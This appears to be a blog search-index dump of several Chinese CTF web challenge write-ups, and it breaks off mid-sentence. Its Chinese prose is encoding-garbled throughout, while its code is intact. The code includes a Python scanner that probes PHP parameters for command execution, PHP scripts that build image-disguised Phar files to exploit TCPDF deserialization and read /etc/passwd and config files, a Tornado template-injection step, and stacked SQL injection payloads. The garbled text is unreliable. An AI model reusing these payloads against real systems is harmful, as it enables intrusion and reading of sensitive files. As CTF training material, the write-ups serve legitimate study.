ç±»ä¼¼äºå‘½ä»¤æ‰§è¡Œçš„åé—¨ï¼Œä½†æ˜¯éƒ½è¢«æå‰ç½®ç©ºäº†ï¼Œå› è€Œæ— æ³•è§¦å‘ã€‚çŒœæµ‹æŸä¸ªæ–‡ä»¶ä¸‹æœ‰å‚æ•°æ²¡æœ‰ç½®ç©ºï¼Œå› æ­¤èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æš´åŠ›æ‰«ææ‰€æœ‰çš„GETå’ŒPOSTå‚æ•°ï¼Œæµ‹è¯•å‘½ä»¤ä¸º'echo qwertyuiop'ï¼Œå¦‚æœåœ¨è¿”å›é¡µé¢ä¸­å‡ºç°äº†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import multiprocessingimport osimport reimport requestsurl = &quot;http://127.0.0.1/src/&quot;counts = 0def process(url, file, method, parameter): if method == &quot;get&quot;: a = requests.get(&quot;&#123;0&#125;/&#123;1&#125;?&#123;2&#125;=echo &#x27;qwertyuiop&#x27;&quot;.format(url, file, parameter)) if &quot;qwertyuiop&quot; in a.text: print(&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;.format(file, method, parameter)) exit() if method == &quot;post&quot;: data = dict() data[parameter] = &quot;echo &#x27;qwertyuiop&#x27;&quot; a = requests.post(&quot;&#123;0&#125;/&#123;1&#125;&quot;.format(url, file), data=data) if &quot;qwertyuiop&quot; in a.text: print(&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;.format(file, method, parameter)) exit()def read_file(single_file): global counts counts += 1 print(&quot;[+]Processing file:&#123;0&#125;&quot;.format(single_file)) lines = open(single_file).readlines() get_pattern = r&quot;\\$_GET\\[\\S+\\]&quot; post_pattern = r&quot;\\$_POST\\[\\S+\\]&quot; for line in lines: get_obj = re.search(get_pattern, line) post_obj = re.search(post_pattern, line) if get_obj: print(&quot;[+]Found get parameter:&#123;0&#125;&quot;.format(get_obj.group())) parameter = get_obj.group()[7:-2] process(url=url, method=&quot;get&quot;, parameter=parameter, file=single_file) if post_obj: print(&quot;[+]Found post parameter:&#123;0&#125;&quot;.format(post_obj.group())) parameter = post_obj.group()[8:-2] process(url=url, file=single_file, method=&quot;post&quot;, parameter=parameter)if __name__ == &quot;__main__&quot;: dir = &quot;D:\\\\Onedrive\\\\desktop\\\\src&quot; os.chdir(dir) result_file = os.listdir(dir) p = multiprocessing.Pool(30) for a in range(0, 100): p.apply_async(func=read_file, args=(result_file[a * 30 + 0],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 1],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 2],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 3],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 4],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 5],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 6],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 7],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 8],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 9],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 10],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 11],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 12],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 13],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 14],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 15],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 16],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 17],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 18],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 19],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 20],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 21],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 22],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 23],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 24],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 25],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 26],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 27],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 28],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 29],)) p.close() p.join() read_file(result_file[-1]) print(counts) æœ€åæœç„¶è·‘å‡ºæ¥äº†ï¼Œxk0SzyKwfzw.phpï¼ŒGET Efa5BVGï¼Œé‚£ä¹ˆç›´æ¥cat /flagå³å¯ã€‚ flag{ac2b73b9-08fa-4525-8073-fc95b0c7f905}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"Chaos-Communication-Camp-2019-PDFCreator","slug":"Chaos-Communication-Camp-2019-PDFCreator","date":"2019-08-29T03:52:02.000Z","updated":"2019-12-10T12:15:12.607Z","comments":true,"path":"2019/08/29/Chaos-Communication-Camp-2019-PDFCreator/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/29/Chaos-Communication-Camp-2019-PDFCreator/","excerpt":"ä¸€é“ç»™äº†code.zipçš„é¢˜ã€‚ æ‰“å¼€æ˜¯ä¸ªPDFè½¬æ¢ç½‘ç«™ã€‚æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åæäº¤ç”ŸæˆPDFæ–‡ä»¶ï¼Œè¿”å›HTMLä¿¡æ¯ã€‚ é‚£ä¹ˆï¼Œæ¥çœ‹ä¸€ä¸‹æºç ã€‚index.phpä¸­å…è®¸æˆ‘ä»¬ä¸Šä¼ pngã€jpgã€jpegã€gifæ ¼å¼çš„å›¾ç‰‡ï¼ŒåŒæ—¶ï¼Œè¿˜ä½¿ç”¨exif_imagetype()æ¥åˆ¤æ–­å›¾ç‰‡æ ¼å¼ã€‚æœ€åä½¿ç”¨PDFCreator()-&gt;createPdf()æ¥è½¬æ¢PDFæ–‡ä»¶ã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥å¾—åˆ°TCPDFçš„ç‰ˆæœ¬ä¸º6.2.13.","text":"ä¸€é“ç»™äº†code.zipçš„é¢˜ã€‚ æ‰“å¼€æ˜¯ä¸ªPDFè½¬æ¢ç½‘ç«™ã€‚æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åæäº¤ç”ŸæˆPDFæ–‡ä»¶ï¼Œè¿”å›HTMLä¿¡æ¯ã€‚ é‚£ä¹ˆï¼Œæ¥çœ‹ä¸€ä¸‹æºç ã€‚index.phpä¸­å…è®¸æˆ‘ä»¬ä¸Šä¼ pngã€jpgã€jpegã€gifæ ¼å¼çš„å›¾ç‰‡ï¼ŒåŒæ—¶ï¼Œè¿˜ä½¿ç”¨exif_imagetype()æ¥åˆ¤æ–­å›¾ç‰‡æ ¼å¼ã€‚æœ€åä½¿ç”¨PDFCreator()-&gt;createPdf()æ¥è½¬æ¢PDFæ–‡ä»¶ã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥å¾—åˆ°TCPDFçš„ç‰ˆæœ¬ä¸º6.2.13. ç½‘ä¸Šæœä¸€ä¸‹TCPDFçš„æ¼æ´ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°è¿™ä¸ªï¼Œä¸€ä¸ªååºåˆ—åŒ–å¯¼è‡´çš„RCEï¼Œåˆæ˜¯Pharååºåˆ—åŒ–çš„é”…ã€‚ç®€å•åœ°è¯´ï¼Œæ˜¯TCPDFç”ŸæˆPDFæ–‡ä»¶çš„æ—¶å€™å…è®¸æ’å…¥HTMLä»£ç ï¼Œä¾‹å¦‚&lt;link type=\"text/css\" href=\"style.css\"&gt;ï¼Œä½†å¦‚æœæ¶æ„ä¿®æ”¹hrefå‚æ•°ä¸ºphar://ï¼Œå°±ä¼šè§¦å‘Pharçš„ååºåˆ—åŒ–é€ æˆRCEã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦åšçš„æœ‰ å‘PDFæ–‡ä»¶æ’å…¥æ¶æ„çš„HTML å‡†å¤‡å¥½ç¬¦åˆæ¡ä»¶çš„PharåŒ… æ‰¾åˆ°Pharçš„ååºåˆ—åŒ–æ”»å‡»å¯¹è±¡ å‘PDFæ–‡ä»¶æ’å…¥HTMLï¼Œè¿™ä¸ªå¾ˆå®¹æ˜“åŠåˆ°ï¼Œåœ¨index.phpä¸­æœ‰å¦‚ä¸‹ä»£ç  123456else if (isset($_POST[&quot;pdfcontent&quot;]))&#123; $creator = new \\PDFStuff\\PDFCreator(); $creator-&gt;createPdf($_POST[&quot;pdfcontent&quot;]);&#125;?&gt; åªè¦æˆ‘ä»¬æäº¤pdfcontentå³å¯ã€‚ å°†Pharæ–‡ä»¶æ³¨å…¥åˆ°æ­£å¸¸çš„å›¾ç‰‡æ–‡ä»¶ä¸­ï¼Œå‚è€ƒè¿™ä¸ªã€‚ æœ€åä¸€ä¸ªé—®é¢˜ä¹Ÿæ˜¯æœ€é‡è¦çš„é—®é¢˜ï¼ŒPharåºåˆ—åŒ–æ”»å‡»å“ªé‡Œï¼Ÿåœ¨creator.phpä¸­æœ‰å¦‚ä¸‹ä»£ç  123456789101112131415 function \\_\\_destruct() &#123; if (file_exists($this-&gt;tmpfile)) &#123;$info = pathinfo($this-&gt;tmpfile);if ($info[&#x27;extension&#x27;] == &quot;pdf&quot;)&#123; unlink($this-&gt;tmpfile);&#125;else&#123; echo &quot;Could not delete created PDF: Not a pdf. Check the file: &quot; . file_get_contents($this-&gt;tmpfile);&#125; &#125; &#125; __destructä¼šåœ¨ç±»é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œè€Œå®ƒä¼šè°ƒç”¨file_get_contents()è¿›è¡Œè¯»æ–‡ä»¶ã€‚ é‚£ä¹ˆï¼Œç”ŸæˆPharåŒ…çš„ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223&lt;?php$jpeg_header_size = &quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot;.&quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot;.&quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot;.&quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot;.&quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot;.&quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot;.&quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot;.&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot;.&quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot;.&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot;.&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot;.&quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);$o = new \\PDFStuff\\PDFCreator();$o-&gt;tmpfile = &quot;/etc/passwd&quot;;$phar-&gt;setMetadata($o);$phar-&gt;stopBuffering(); è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆphar.pharï¼Œæˆ‘ä»¬å°†å…¶æ”¹åä¸ºaaa.jpegï¼Œæ­£å¸¸ä¸Šä¼ ã€‚ç„¶åæˆ‘ä»¬åœ¨ä¸‹é¢çš„HTMLåŒºåŸŸæäº¤&lt;html&gt;&lt;link type=\"text/css\" href=\"phar://./upload/098f6bcd4621d373cade4e832627b4f6.jpeg\"&gt;hello&lt;/link&gt;&lt;/html&gt;å³å¯ã€‚ï¼ˆæ–‡ä»¶åè‡ªå·±æ¢ï¼‰ ç„¶åå°±æ€ä¹ˆéƒ½æ²¡æ‰“é€šï¼ŒæŸ¥äº†åŠå¤©åŸå› ï¼Œå‘ç°æºç ä¸­çš„PDFCreatorç±»æ˜¯å±äºPDFStuffå‘½åç©ºé—´ä¸‹çš„ï¼Œå› æ­¤æˆ‘ä»¬åŒæ ·éœ€è¦åœ¨PDFStuffçš„å‘½åç©ºé—´ä¸‹ç”ŸæˆPharã€‚ 1234567891011121314151617&lt;?phpnamespace PDFStuff &#123; class PDFCreator &#123; public $tmpfile = &quot;/etc/nginx/nginx.conf&quot;; public $finalfile; &#125; $phar = new \\Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;setStub(&quot;GIF89a&quot; . &quot; __HALT_COMPILER(); ?&gt;&quot;); $o = new PDFCreator(); $phar-&gt;setMetadata($o); $phar-&gt;stopBuffering();&#125; æ³¨æ„Pharéœ€è¦ä½¿ç”¨\\Pharï¼Œå› ä¸ºPharç±»æ˜¯åœ¨æ ¹å‘½åç©ºé—´ä¸‹çš„ã€‚ ä¸Šä¼ åæäº¤ã€‚åœ¨è¿”å›çš„é¡µé¢ä¸­å‡ºç°äº†/etc/nginx/nginx.confçš„å†…å®¹ï¼Œæˆ‘ä»¬çŸ¥é“webrootåœ¨/var/www/site/ä¸‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¯»/var/www/site/flag.phpå³å¯å¾—åˆ°flagã€‚ P.S. å¦‚æœä¸æ‰‹åŠ¨å£°æ˜namespaceï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥include creator.phpï¼Œå³PoCå¦‚ä¸‹ï¼š 12345678910111213&lt;?phpinclude &#x27;creator.php&#x27;; $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;setStub(&quot;GIF89a&quot; . &quot; __HALT_COMPILER(); ?&gt;&quot;); $o = new \\PDFStuff\\PDFCreator(); $o-&gt;tmpfile=&quot;/etc/nginx/nginx.conf&quot;; $phar-&gt;setMetadata($o); $phar-&gt;stopBuffering(); flag{f7a40718-9e36-436a-bc1f-ccbd898e918c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":"TCPDF","slug":"TCPDF","permalink":"http://tiaonmmn.github.io/tags/TCPDF/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Easy_Tornado","slug":"BUUOJåˆ·é¢˜-Web-Easy-Tornado","date":"2019-08-28T01:17:51.000Z","updated":"2019-12-10T12:15:12.598Z","comments":true,"path":"2019/08/28/BUUOJåˆ·é¢˜-Web-Easy-Tornado/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Tornado/","excerpt":"2018æŠ¤ç½‘æ¯ Easy Tornadoã€‚ æ‰“å¼€åç»™äº†ä¸‰ä¸ªé“¾æ¥ã€‚/flag.txtæç¤ºflagåœ¨/fllllllllllllagè¿™é‡Œã€‚/welcome.txtæç¤ºrenderã€‚/hints.txtæç¤ºmd5(cookie_secret+md5(filename))ã€‚ è¿™ä¸‰ä¸ªé“¾æ¥çš„URLç±»ä¼¼ï¼Œå½¢å¦‚file?filename=/hints.txt&amp;filehash=02349af91320adb103fb59e50a5f580aï¼Œé‚£ä¹ˆåˆç†çŒœæµ‹filehashçš„ç®—æ³•åº”è¯¥å°±æ˜¯hints.txté‡Œæåˆ°çš„ä¸œè¥¿äº†ã€‚æˆ‘ä»¬éšæ„ä¿®æ”¹filenameï¼Œä¼šå‘ç°è½¬åˆ°äº†error?msg=Errorã€‚","text":"2018æŠ¤ç½‘æ¯ Easy Tornadoã€‚ æ‰“å¼€åç»™äº†ä¸‰ä¸ªé“¾æ¥ã€‚/flag.txtæç¤ºflagåœ¨/fllllllllllllagè¿™é‡Œã€‚/welcome.txtæç¤ºrenderã€‚/hints.txtæç¤ºmd5(cookie_secret+md5(filename))ã€‚ è¿™ä¸‰ä¸ªé“¾æ¥çš„URLç±»ä¼¼ï¼Œå½¢å¦‚file?filename=/hints.txt&amp;filehash=02349af91320adb103fb59e50a5f580aï¼Œé‚£ä¹ˆåˆç†çŒœæµ‹filehashçš„ç®—æ³•åº”è¯¥å°±æ˜¯hints.txté‡Œæåˆ°çš„ä¸œè¥¿äº†ã€‚æˆ‘ä»¬éšæ„ä¿®æ”¹filenameï¼Œä¼šå‘ç°è½¬åˆ°äº†error?msg=Errorã€‚ é—®é¢˜åœ¨äºï¼Œä¸ºä»€ä¹ˆerroré¡µé¢éœ€è¦ä¸€ä¸ªmsgå‚æ•°ï¼Ÿæˆ‘ä»¬éšæ„æ”¹ä¸€ä¸‹msgï¼Œå‘ç°æ˜¾ç¤ºå†…å®¹ä¹Ÿéšä¹‹æ”¹å˜ã€‚é‚£ä¹ˆè¿™é‡Œå°±æ˜¯ä¸€ä¸ªSSTIäº†ã€‚ ä¸‹ä¸€æ­¥æ˜¯æ‹¿åˆ°cookie_secretï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹SSTIè¯»æ–‡ä»¶ã€‚å‘ç°è¯»ä¸äº†ï¼Œè¿‡æ»¤äº†ç›¸å½“å¤šçš„å­—ç¬¦ã€‚é‚£ä¹ˆè¯•ä¸€ä¸‹è¯»Contextå§ã€‚æˆ‘ä»¬å·²çŸ¥å¹³å°åç«¯æ˜¯Tornadoæ¡†æ¶ï¼Œç¿»æ–‡æ¡£ï¼Œå‘ç°åœ¨æ¨¡æ¿é‡Œæœ‰ä¸€ä¸ªhandleræŒ‡å‘å½“å‰RequestHandlerï¼Œé‚£ä¹ˆå†æ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°settingsäº†ã€‚ æäº¤error?msg=ï¼Œè¿”å›é¡µé¢é‡Œå‡ºç°äº†cookie_secretï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰‹åŠ¨è®¡ç®—flagæ–‡ä»¶çš„hashäº†ã€‚ flag{0b52d4e0-0c3b-4734-8bcb-d208b026336b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Tornado","slug":"Tornado","permalink":"http://tiaonmmn.github.io/tags/Tornado/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"}]},{"title":"BUUOJåˆ·é¢˜-Web-éšä¾¿æ³¨","slug":"BUUOJåˆ·é¢˜-Web-éšä¾¿æ³¨","date":"2019-08-27T03:55:46.000Z","updated":"2019-12-10T12:15:12.605Z","comments":true,"path":"2019/08/27/BUUOJåˆ·é¢˜-Web-éšä¾¿æ³¨/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/27/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"2019å¼ºç½‘æ¯çš„éšä¾¿æ³¨ã€‚ æäº¤1ï¼Œè¿”å› 123456array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;","text":"2019å¼ºç½‘æ¯çš„éšä¾¿æ³¨ã€‚ æäº¤1ï¼Œè¿”å› 123456array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125; çœ‹èµ·æ¥ä½¿ç”¨äº†print_r()æŠŠè¿”å›çš„æ•°ç»„ç›´æ¥æ‰“å°äº†å‡ºæ¥ã€‚ æäº¤1'ï¼Œè¿”å›error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1ï¼ŒMySQLæ•°æ®åº“äº†ã€‚åŒæ—¶çŒœä¸€ä¸‹SQLè¯­å¥æ˜¯select ''$_GET['inject']'' from XXã€‚ æäº¤1'--+ï¼ŒæŠŠ--+è¿‡æ»¤äº†ã€‚åŒæ ·çš„ï¼Œæäº¤1'#ï¼Œæ­£å¸¸è¿”å›ã€‚ æäº¤1' union select 1,2,3%23ï¼Œå‘ç°è¿”å›return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);ã€‚å¸¸è§å…³é”®å­—è¿‡æ»¤äº†ã€‚ æäº¤1' or '1'='1ï¼Œå‘ç°æŠŠè¡¨é‡Œçš„æ•°æ®éƒ½è¿”å›äº†ï¼Œoræ²¡æœ‰è¢«è¿‡æ»¤ã€‚ é‚£ä¹ˆï¼Œæäº¤1' order by 1#ï¼Œé¡µé¢æ­£å¸¸ï¼Œæäº¤1' order by 2#ï¼Œé¡µé¢æ­£å¸¸ï¼Œæäº¤1' order by 3#ï¼Œè¿”å›error 1054 : Unknown column '3' in 'order clause'ï¼Œé‚£ä¹ˆè¿™å¼ è¡¨é‡Œåªæœ‰ä¸¤ä¸ªå­—æ®µã€‚ ç„¶åå°±æ¶‰åŠåˆ°æ–°çš„çŸ¥è¯†ç‚¹å †å æ³¨å…¥ã€‚ç®€å•åœ°è®²ï¼Œå°±æ˜¯MySQLå…è®¸å°†å¤šä¸ªSQLè¯­å¥æ”¾åœ¨ä¸€ä¸ªæŸ¥è¯¢é‡Œæäº¤ã€‚æˆ‘ä»¬è¯•ä¸€ä¸‹1'show databases;#ï¼Œè¿”å› 123456789101112131415161718192021222324252627282930array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(4) &quot;test&quot;&#125; çœ‹æ¥å¯ä»¥ã€‚ é‚£ä¹ˆä¸‹ä¸€æ­¥è¦æ‹¿åˆ°å½“å‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æäº¤1';show tables;#ï¼Œè¿”å› 1234567891011121314array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(5) &quot;words&quot;&#125; 1919810931114514è¡¨çœ‹èµ·æ¥å¾ˆæœ‰æ„æ€ã€‚ä¸‹ä¸€æ­¥è·å¾—åˆ—åã€‚æäº¤1';show columns from \\1919810931114514`;`ï¼Œè¿”å› 1234567891011121314151617181920array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(4) &quot;flag&quot; [1]&#x3D;&gt; string(12) &quot;varchar(100)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125; flagçœ‹æ¥å°±åœ¨1919810931114514è¡¨é‡Œï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨éœ€è¦è·¨è¡¨æŸ¥è¯¢ï¼Œä¸”ä¸èƒ½å‡ºç°selectã€‚ä¸¤ç§æ€è·¯ï¼šä¸€ç§æ˜¯æ›¿æ¢è¡¨ã€‚æˆ‘ä»¬æ— æ³•æ‰‹åŠ¨æŸ¥è¯¢å…¶ä»–çš„è¡¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°†è¦æŸ¥è¯¢çš„è¡¨æ”¹åæˆå½“å‰çš„è¡¨ï¼Œè¿™æ ·æ­£å¸¸è®¿é—®ç½‘é¡µçš„æ—¶å€™å°±ä¼šå¸¦å‡ºæ¥æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚äºŒæ˜¯åˆ©ç”¨MySQLçš„PREPAREå’ŒEXECUTEï¼Œä»»æ„æ‰§è¡ŒSQLè¯­å¥ã€‚ä½†ç”±äºæŸäº›å…³é”®å­—çš„è¿‡æ»¤ï¼Œå› æ­¤SQLè¯­å¥éœ€è¦è¿›è¡Œä¸€äº›å¤„ç†ã€‚ æ›¿æ¢è¡¨ é€šè¿‡show 